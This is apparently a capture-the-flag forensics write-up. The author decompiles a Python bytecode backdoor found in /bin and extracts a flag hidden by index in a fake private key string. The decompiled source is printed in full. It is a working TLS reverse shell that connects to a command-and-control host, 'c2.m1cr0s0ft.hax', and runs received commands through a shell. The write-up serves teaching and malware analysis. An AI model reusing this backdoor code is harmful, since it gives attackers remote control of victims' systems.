# Changing our locks and dumping old Keys

![](https://i.imgur.com/rWoGcFl.png)

- Searching the os after pwning it, I found a file called `stayalive` in `/bin` and using command `file stayalive`, it appears to be a python 3.8 byte-compiled file

- to decompile the python folder I used [Decompyle++](https://github.com/zrax/pycdc), the installation guide is easy then I used it to extract the source code from the original file but it generated a c code and for some reason, it didn't work as expected so a teammate guided me to a tool called uncompyle6

```python

import socket, subprocess, os, ssl

def sczsz():
    global c2domain
    global c2port
    global s
    global ssls
    global tt
    try:
        tt = [29, 33, 35, 42, 44, 57, 66, 72, 81, 85, 88, 89, 97, 103, 128, 135, 144, 152, 195, 199, 203, 207, 217, 231, 236, 239, 245, 260, 266, 273, 292, 310, 319, 337, 354, 357, 366, 377, 385, 414, 418, 421]
        c2domain = 'c2.m1cr0s0ft.hax'
        c2port = 64318
        s = socket.socket()
        ssls = ssl.wrap_socket(s, ssl_version=(ssl.PROTOCOL_TLSv1_2))
    except socket.error as OO00OOOO0O00O00OO:
        try:
            try:
                print('socket creation error: ' + str(OO00OOOO0O00O00OO))
            finally:
                OO00OOOO0O00O00OO = None
                del OO00OOOO0O00O00OO

        finally:
            OO00OOOO0O00O00OO = None
            del OO00OOOO0O00O00OO


def cscsz():
    try:
        ssls.connect((c2domain, c2port))
        xbx = '--- BEGIN PRIVATE KEY ---\t\tfCfnaEldanaKJdiga{enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\t\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\t\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\t\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\t\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\t\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw}6nCaf\t\t--- END PRIVATE KEY ---'
        ssls.send(str.encode(str(os.getcwd()) + '<' + ''.join([xbx[x] for x in tt]) + '>' + ' > '))
    except socket.error as O0OO000O0OO0000OO:
        try:
            try:
                print('socket conn error: ' + str(O0OO000O0OO0000OO))
            finally:
                O0OO000O0OO0000OO = None
                del O0OO000O0OO0000OO

        finally:
            O0OO000O0OO0000OO = None
            del O0OO000O0OO0000OO


def zszszs():
    while True:
        O00OO000O00OOO0O0 = ssls.recv(1024)
        O00OO000O00OOO0O0 = O00OO000O00OOO0O0.decode('utf-8').strip()
        print('received ' + O00OO000O00OOO0O0)
        if O00OO000O00OOO0O0[:2] == 'cd':
            os.chdir(O00OO000O00OOO0O0[3:])
            ssls.send(str.encode(str(os.getcwd()) + ' > '))
        else:
            if len(O00OO000O00OOO0O0) > 0:
                OO0000OO0O0000OO0 = subprocess.Popen(O00OO000O00OOO0O0, shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE), stdin=(subprocess.PIPE))
                O000000000O0OOO00 = OO0000OO0O0000OO0.stdout.read() + OO0000OO0O0000OO0.stderr.read()
                O0000O0O0OO0O0OO0 = str(O000000000O0OOO00.decode('utf-8'))
                ssls.send(str.encode(O0000O0O0OO0O0OO0 + str(os.getcwd()) + ' > '))
                if len(O0000O0O0OO0O0OO0.split('\n')) > 2:
                    OO0O00OOO00OO0OO0 = 2
                else:
                    OO0O00OOO00OO0OO0 = 0
                print('Sent: ' + OO0O00OOO00OO0OO0 * '\n' + O0000O0O0OO0O0OO0)
        if not O00OO000O00OOO0O0:
            break

    s.close()


def main():
    sczsz()
    cscsz()
    zszszs()


if __name__ == '__main__':
    main()
```

- this took me some time but we need to focus only on two things this array `tt = [29, 33, 35, 42, 44, 57, 66, 72, 81, 85, 88, 89, 97, 103, 128, 135, 144, 152, 195, 199, 203, 207, 217, 231, 236, 239, 245, 260, 266, 273, 292, 310, 319, 337, 354, 357, 366, 377, 385, 414, 418, 421]` and `xbx = '--- BEGIN PRIVATE KEY ---\t\tfCfnaEldanaKJdiga{enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\t\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\t\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\t\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\t\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\t\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw}6nCaf\t\t--- END PRIVATE KEY ---'` this key if we notice carefully we can see that the `tt` is the indeces of char in the key that if printed out together will form a flag so let's write a simple script to do that for us

```python
tt = [29, 33, 35, 42, 44, 57, 66, 72, 81, 85, 88, 89, 97, 103, 128, 135, 144, 152, 195, 199, 203, 207, 217, 231, 236, 239, 245, 260, 266, 273, 292, 310, 319, 337, 354, 357, 366, 377, 385, 414, 418, 421]

xbx = '--- BEGIN PRIVATE KEY ---\t\tfCfnaEldanaKJdiga{enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\t\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\t\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\t\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\t\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\t\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw}6nCaf\t\t--- END PRIVATE KEY ---'

for i in tt:
    print(xbx[i],end="")
```

- Flag: flag{b4ckd00rs_4r3_us3ful_f0r_p3rs1st3nc3}